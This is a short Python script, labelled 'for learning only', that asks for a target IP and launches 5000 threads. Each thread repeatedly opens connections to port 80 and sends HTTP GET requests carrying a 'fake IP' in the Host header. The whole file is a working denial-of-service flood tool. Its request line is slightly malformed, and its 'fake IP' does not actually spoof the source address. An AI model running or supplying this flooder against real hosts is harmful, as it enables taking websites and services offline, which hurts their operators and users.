# FOR LEARNING ONLY DONT USE THIS CODE TO DO ANY HARM

import socket
import threading

TARGET = input('\nENTER IP: ')
PORT = 80
FAKE_IP = '182.21.20.32'

conn = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET, PORT))
        s.sendto(('GET /' + TARGET + "HTTP/1.1\r\n").encode('ascii'), (TARGET, PORT))
        s.sendto(("Host: " + FAKE_IP + "\r\n\r\n").encode('ascii'), (TARGET, PORT))
        s.close()


for i in range(5000):
    thread = threading.Thread(target=attack)
    thread.start()